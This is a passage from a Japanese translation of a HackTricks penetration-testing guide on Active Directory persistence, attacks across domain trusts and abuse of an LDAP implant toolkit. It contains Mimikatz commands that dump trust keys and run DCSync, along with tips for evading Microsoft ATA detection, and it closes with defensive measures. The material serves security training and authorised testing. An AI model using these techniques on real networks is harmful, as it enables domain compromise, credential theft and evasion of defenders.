すべての **Domain Controller (DC)** にはローカル管理者アカウントが存在します。そうしたマシンで管理権限を取得すると、mimikatz を用いてローカル Administrator のハッシュを抽出できます。その後、レジストリの変更が必要になり、このパスワードを**有効にして**リモートからローカル Administrator アカウントにアクセスできるようにします。


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

特定のドメインオブジェクトに対して**特別な権限**を**ユーザーに付与**することで、そのユーザーが将来的に権限を**昇格**できるようにすることが可能です。


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

**Security descriptors** はオブジェクトが持つ **権限** を**格納**するために使われます。オブジェクトの security descriptor に**小さな変更**を施すだけで、特権グループのメンバーである必要なく、そのオブジェクトに対して非常に興味深い権限を得られることがあります。


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

`dynamicObject` 補助クラスを悪用して、`entryTTL`/`msDS-Entry-Time-To-Die` を使い短命のプリンシパル/GPO/DNS レコードを作成すると、それらは tombstone を残さずに自己削除され、LDAP の証拠を消せますが、孤立した SID、壊れた `gPLink` 参照、またはキャッシュされた DNS レスポンス（例：AdminSDHolder ACE 汚染や悪意ある `gPCFileSysPath`/AD 統合 DNS リダイレクト）を残すことがあります。

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

LSASS をメモリ上で変更して**ユニバーサルパスワード**を設定し、すべてのドメインアカウントへのアクセスを可能にします。


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Learn what is a SSP (Security Support Provider) here.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
独自の **SSP** を作成して、マシンにアクセスする際の資格情報を**平文でキャプチャ**することができます。


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

AD に新しい Domain Controller を登録し、それを使って指定されたオブジェクトに対して（SIDHistory、SPNs など）属性を**ログを残さずに**プッシュします。これには DA 権限が必要で、ルートドメイン内にいる必要があります。\
ただし、誤ったデータを使うと見苦しいログが残ることがあります。

{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

前述したように、LAPS パスワードを読むための十分な権限がある場合に権限を昇格する方法を説明しました。しかし、これらのパスワードは**永続化**にも使えます。\
参照：


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft は **Forest** をセキュリティ境界と見なしています。これは、**単一のドメインの侵害が Forest 全体の侵害につながる可能性がある**ことを意味します。

### Basic Information

[**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) は、ある **ドメイン** のユーザーが別の **ドメイン** のリソースにアクセスすることを可能にするセキュリティメカニズムです。これは二つのドメインの認証システム間にリンクを作り、認証検証がシームレスに流れるようにします。ドメインが信頼を設定すると、両方の Domain Controller (DC) に特定の **キー** が交換・保持され、信頼の整合性に重要な役割を果たします。

一般的なシナリオでは、ユーザーが **信頼されたドメイン** のサービスにアクセスしようとする場合、まず自分のドメインの DC から特別なチケットである **inter-realm TGT** を要求する必要があります。この TGT は両ドメインが合意した共有 **キー** で暗号化されます。ユーザーはその後、この TGT を **信頼されたドメインの DC** に提示してサービスチケット（**TGS**）を取得します。信頼されたドメインの DC が inter-realm TGT を検証して有効であれば、所望のサービスに対する TGS を発行し、ユーザーにアクセスを許可します。

**手順**:

1. **Domain 1** の **クライアントコンピュータ** が自らの **NTLM hash** を使って **Domain Controller (DC1)** から **Ticket Granting Ticket (TGT)** を要求してプロセスを開始します。
2. クライアントが認証されれば、DC1 は新しい TGT を発行します。
3. クライアントは次に、**Domain 2** のリソースにアクセスするために DC1 から **inter-realm TGT** を要求します。
4. inter-realm TGT は、二つのドメイン間の双方向のドメイン信頼の一部として DC1 と DC2 が共有する **trust key** で暗号化されます。
5. クライアントは inter-realm TGT を **Domain 2 の Domain Controller (DC2)** に持っていきます。
6. DC2 は共有された trust key を使って inter-realm TGT を検証し、有効であればクライアントがアクセスしようとしている Domain 2 のサーバーに対する **Ticket Granting Service (TGS)** を発行します。
7. 最後に、クライアントはこの TGS をサーバーに提示し、サーバーはそれをサーバーのアカウントハッシュで暗号化された形で受け取り、Domain 2 のサービスへのアクセスを取得します。

### Different trusts

信頼は **一方向** または **双方向** のいずれかであることを覚えておいてください。双方向の場合、両ドメインは互いを信頼しますが、**一方向** の信頼関係では片方が **trusted** で他方が **trusting** です。後者では、**trusted ドメインから trusting ドメイン内のリソースにのみアクセス可能**です。

もし Domain A が Domain B を信頼するなら、A は trusting ドメインで B は trusted ドメインです。さらに、**Domain A** ではこれは **Outbound trust** になり、**Domain B** では **Inbound trust** になります。

**異なる信頼関係の種類**

- **Parent-Child Trusts**: 同一フォレスト内で一般的な構成で、子ドメインは自動的に親ドメインと二方向の推移的信頼を持ちます。これにより、親と子の間で認証要求がシームレスに流れます。
- **Cross-link Trusts**: 「shortcut trusts」と呼ばれ、リファラルプロセスを高速化するために子ドメイン間で設定されます。複雑なフォレストでは、認証のリファラルは通常フォレストルートまで上がり、そこからターゲットドメインへ下がる必要がありますが、cross-link を作ることでその経路を短縮できます。
- **External Trusts**: 異なる無関係なドメイン間で設定される非推移的な信頼です。Microsoft のドキュメントによると、external trusts はフォレスト信頼で接続されていないフォレスト外のドメインのリソースにアクセスするために有用です。外部信頼では SID filtering によってセキュリティが強化されます。
- **Tree-root Trusts**: これはフォレストルートドメインと新たに追加されたツリールート間で自動的に確立されます。一般的ではありませんが、フォレストに新しいドメインツリーを追加する際に重要で、二方向の推移性を持たせます。
- **Forest Trusts**: これは二つのフォレストルートドメイン間の二方向の推移的信頼で、SID filtering によるセキュリティ強化も行われます。
- **MIT Trusts**: これらは非-Windows の [RFC4120 準拠](https://tools.ietf.org/html/rfc4120) の Kerberos ドメインとの間に確立されます。MIT trusts は Windows エコシステム外の Kerberos ベースのシステムと統合する環境向けのやや専門的なものです。

#### Other differences in **trusting relationships**

- 信頼関係は **推移的**（A が B を信頼し、B が C を信頼すれば A が C を信頼する）または **非推移的** に設定できます。
- 信頼関係は **双方向信頼**（双方が互いを信頼）または **一方向信頼**（片方のみが相手を信頼）として設定できます。

### Attack Path

1. **信頼関係を列挙**する
2. どの **セキュリティプリンシパル**（user/group/computer）が**他ドメインのリソースにアクセス**できるかを確認する。ACE エントリや他ドメインのグループに属しているかを探す。**ドメイン間の関係性**を探す（信頼はおそらくこれのために作成されている）。
1. この場合 kerberoast が別のオプションになることもある。
3. ドメイン間を**ピボット**できる**アカウントを侵害**する。

攻撃者が他ドメインのリソースにアクセスできる主要なメカニズムは次の三つです：

- **ローカルグループメンバーシップ**: プリンシパルがサーバー上の “Administrators” グループなどのローカルグループに追加され、当該マシンに対して重大な制御権を得る可能性があります。
- **外部ドメイングループのメンバーシップ**: プリンシパルが外部ドメイン内のグループのメンバーであることもあります。ただし、この方法の有効性は信頼の性質やグループのスコープに依存します。
- **Access Control Lists (ACLs)**: プリンシパルが **ACL** に指定されている場合、特に **DACL** 内の **ACE** として、特定のリソースへのアクセス権を与えられます。ACL、DACL、ACE の仕組みをさらに深く知りたい場合は、whitepaper “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” が非常に参考になります。

### Find external users/groups with permissions

外部のセキュリティプリンシパルを見つけるには、`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com` を確認できます。これらは **外部ドメイン/フォレスト** からのユーザー/グループです。

これを **Bloodhound** で確認するか、powerview を使用して確認できます：
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### 子フォレストから親フォレストへの権限昇格
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
ドメインの信頼関係を列挙するその他の方法:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> **2 trusted keys** が存在します。1つは _Child --> Parent_ 用、もう1つは _Parent_ --> _Child_ 用です。\
> 現在のドメインで使用されている鍵を確認するには、次のコマンドを実行します:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

トラストを悪用して SID-History injection により child/parent domain で Enterprise admin に昇格します:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Configuration NC がどのように悪用され得るかを理解することは重要です。Configuration NC は AD 環境内のフォレスト全体の構成データの中央リポジトリとして機能します。このデータはフォレスト内のすべての Domain Controller (DC) にレプリケートされ、writable DCs は Configuration NC の書き込み可能なコピーを保持します。これを悪用するには、**DC 上の SYSTEM 権限** が必要で、できれば child DC が望ましいです。

**Link GPO to root DC site**

Configuration NC の Sites コンテナには、AD フォレスト内のドメイン参加コンピュータのサイトに関する情報が含まれます。任意の DC 上で SYSTEM 権限を持っていると、GPOs を root DC site にリンクすることができます。この操作により、これらのサイトに適用されるポリシーを操作して root domain を潜在的に侵害できます。

詳細については、[Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research) の研究を参照してください。

**Compromise any gMSA in the forest**

攻撃ベクターの一つは、ドメイン内の特権 gMSA を標的にすることです。gMSAs のパスワード計算に必要な KDS Root key は Configuration NC に格納されています。任意の DC 上で SYSTEM 権限を持っていれば、KDS Root key にアクセスしてフォレスト内の任意の gMSA のパスワードを計算することが可能です。

詳細な解析と手順は以下を参照してください:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

補助的な delegated MSA 攻撃 (BadSuccessor – migration attributes の悪用):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

追加の外部研究: [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent)。

**Schema change attack**

この手法は、特権を持つ新しい AD オブジェクトの作成を待つ忍耐を要します。SYSTEM 権限があれば、攻撃者は AD Schema を変更して任意のユーザに全クラスの完全コントロールを与えることができます。これにより、新しく作成される AD オブジェクトに対する不正アクセスと制御が可能になります。

詳細は [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent) を参照してください。

**From DA to EA with ADCS ESC5**

ADCS ESC5 脆弱性は、PKI オブジェクトに対する制御を標的とし、フォレスト内の任意のユーザとして認証可能にする証明書テンプレートを作成することを可能にします。PKI オブジェクトは Configuration NC に存在するため、書き込み可能な child DC を乗っ取ることで ESC5 攻撃を実行できます。

これについての詳細は [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c) を参照してください。ADCS が存在しない場合でも、攻撃者は必要なコンポーネントを構築することが可能であり、その点は [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/) で論じられています。

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
このシナリオでは、**あなたのドメインが信頼されている**状態で、外部ドメインからあなたに対して**不明な権限**が与えられています。自ドメインのどの**プリンシパルが外部ドメインに対してどのようなアクセスを持っているか**を見つけ出し、それを悪用してみてください：

{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### 外部フォレストドメイン - 一方向（アウトバウンド）
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
このシナリオでは **あなたのドメイン** が **別のドメイン** からのプリンシパルにいくつかの **権限** を **信頼** しています。

しかし、信頼するドメインによって **domain is trusted** されると、信頼されたドメインは **予測可能な名前** のユーザーを **作成** し、その **パスワード** として信頼関係で使われるパスワード（trusted password）を設定します。つまり、**信頼するドメインのユーザーにアクセスして、信頼されたドメイン内部に侵入し、列挙やさらなる権限昇格を試みることが可能**ということです:

{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

信頼されたドメインを侵害する別の方法は、ドメイン信頼の **逆方向** に作成された [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) を見つけることです（これはあまり一般的ではありません）。

信頼されたドメインを侵害する別の方法は、**trusted domain のユーザーが RDP でログインできる**マシンに潜伏することです。攻撃者は RDP セッションのプロセスにコードを注入し、そこから被害者の**オリジンドメインにアクセス**することができます。\
さらに、もし**被害者が自分のハードドライブをマウントしている**場合、RDP セッションプロセスからハードドライブの **startup folder** に **backdoors** を配置することも可能です。この手法は **RDPInception** と呼ばれます。

{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### ドメイン信頼の悪用緩和

### **SID Filtering:**

- SID Filtering により、forest 間トラストで SID history 属性を悪用するリスクは軽減されます。SID Filtering はすべてのインターフォレストトラストでデフォルトで有効になっています。これは Microsoft の立場に沿って、セキュリティ境界をドメインではなくフォレストとして扱い、フォレスト内トラストは安全であるという前提に基づいています。
- ただし注意点として、SID Filtering はアプリケーションやユーザーアクセスを阻害する可能性があり、そのために無効化されることがある点は留意が必要です。

### **Selective Authentication:**

- インターフォレストトラストでは、Selective Authentication を採用することで、両フォレストのユーザーが自動的に認証されることを防げます。代わりに、信頼するドメイン／フォレスト内のドメインやサーバーにアクセスするには明示的な権限が必要になります。
- ただし、これらの対策は writable Configuration Naming Context (NC) の悪用やトラストアカウントへの攻撃を防ぐものではない点に注意してください。

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## LDAP-based AD Abuse from On-Host Implants

The [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) は bloodyAD-style な LDAP プリミティブを、ホスト内インプラント（例: Adaptix C2）内で完全に動作する x64 Beacon Object Files として再実装したものです。オペレーターはパックを `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make` でコンパイルし、`ldap.axs` をロードしてから beacon から `ldap <subcommand>` を呼び出します。全てのトラフィックは現在のログオンのセキュリティコンテキストで LDAP (389) の署名/シーリング、または自動証明書信頼付きの LDAPS (636) を通して移動するため、socks プロキシやディスク上のアーティファクトは不要です。

### インプラント側のLDAP列挙

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, および `get-groupmembers` は短縮名／OU パスを完全な DN に解決し、対応するオブジェクトをダンプします。
- `get-object`, `get-attribute`, および `get-domaininfo` は任意の属性（security descriptors を含む）と `rootDSE` からのフォレスト／ドメインのメタデータを取得します。
- `get-uac`, `get-spn`, `get-delegation`, および `get-rbcd` は焼き取り（roasting）候補、委任設定、および LDAP から直接取得される既存の [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) ディスクリプタを露呈します。
- `get-acl` と `get-writable --detailed` は DACL を解析してトラスティ（trustees）、権利（GenericAll/WriteDACL/WriteOwner/attribute writes）、および継承を列挙し、ACL による privilege escalation のための即時のターゲットを示します。
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### LDAP 書き込みプリミティブ（エスカレーション & 永続化）

- Object creation BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`) により、OU 権限がある場所に新しいプリンシパルやマシンアカウントを配置できます。`add-groupmember`、`set-password`、`add-attribute`、`set-attribute` は、write-property 権限が見つかればターゲットを直接ハイジャックします。
- ACL に焦点を当てたコマンド（`add-ace`、`set-owner`、`add-genericall`、`add-genericwrite`、`add-dcsync`）は、任意の AD オブジェクトに対する WriteDACL/WriteOwner を、PowerShell/ADSI の痕跡を残さずにパスワードリセット、グループメンバーシップの制御、または DCSync レプリケーション権限へと変換します。`remove-*` 系は注入した ACE のクリーンアップに使えます。

### Delegation, roasting, and Kerberos abuse

- `add-spn`/`set-spn` は、侵害したユーザを即座に Kerberoastable にします。`add-asreproastable`（UAC トグル）はパスワードに触れずに AS-REP roasting 対象としてマークします。
- Delegation マクロ（`add-delegation`、`set-delegation`、`add-constrained`、`add-unconstrained`、`add-rbcd`）は、beacon から `msDS-AllowedToDelegateTo`、UAC フラグ、または `msDS-AllowedToActOnBehalfOfOtherIdentity` を書き換え、constrained/unconstrained/RBCD の攻撃経路を可能にし、リモート PowerShell や RSAT を使う必要を排除します。

### sidHistory injection, OU relocation, and attack surface shaping

- `add-sidhistory` は、制御されたプリンシパルの SID history に特権 SID を注入します（参照: [SID-History Injection](sid-history-injection.md)）。これにより、LDAP/LDAPS 上でステルスにアクセス継承を実現します。
- `move-object` はコンピュータやユーザの DN/OU を変更し、攻撃者が `set-password`、`add-groupmember`、`add-spn` を悪用する前に資産を既に委任権が存在する OU に引き込むことを可能にします。
- 範囲を絞った削除コマンド（`remove-attribute`、`remove-delegation`、`remove-rbcd`、`remove-uac`、`remove-groupmember` 等）は、オペレータが資格情報や永続化を収穫した後に迅速にロールバックでき、テレメトリを最小化します。

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## 一般的な防御策

[**資格情報の保護方法の詳細はこちら。**](../stealing-credentials/credentials-protections.md)

### **資格情報保護のための防御策**

- **Domain Admins 制限**: Domain Admins は Domain Controllers にのみログインできるようにし、他のホストでの使用を避けることを推奨します。
- **Service Account の権限**: サービスは Domain Admin (DA) 権限で実行すべきではありません。
- **一時的な権限制限**: DA 権限を必要とするタスクでは、その期間を制限してください。例えば次のように実現できます: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **LDAP relay 緩和**: Event ID 2889/3074/3075 を監査し、DCs/clients で LDAP signing と LDAPS channel binding を強制して LDAP の MITM/relay 試行を阻止します。

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### **デセプション（欺瞞）技術の実装**

- デセプションの実装は、パスワードが期限切れにならない、または Trusted for Delegation とマークされたダミーのユーザやコンピュータのようなトラップを設定することを含みます。具体的には特定の権利を持つユーザを作成したり、高権限グループに追加したりする方法があります。
- 実用的な例: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- デセプション技術の展開については [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception) を参照してください。

### **デセプションの識別**

- **ユーザオブジェクトに対して**: 異常な ObjectSID、ログオン頻度の低さ、作成日、低い bad password カウントなどが疑わしい指標になります。
- **一般的な指標**: 潜在的なダミーオブジェクトの属性を正規のオブジェクトと比較することで不整合を発見できます。`HoneypotBuster` のようなツールがデセプションの識別に役立ちます。

### **検知回避**

- **Microsoft ATA 検知回避**:
- **ユーザ列挙**: ATA 検知を避けるために Domain Controllers 上でのセッション列挙を避ける。
- **チケット偽装**: チケット作成に **aes** キーを使用すると、NTLM へのダウングレードを避け検知を回避しやすくなります。
- **DCSync 攻撃**: Domain Controller 以外から実行することで ATA 検知を避けることが推奨されます。Domain Controller 上で直接実行するとアラートの原因になります。

## 参考

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [Hashcat](https://github.com/hashcat/hashcat)

{{#include ../../banners/hacktricks-training.md}}
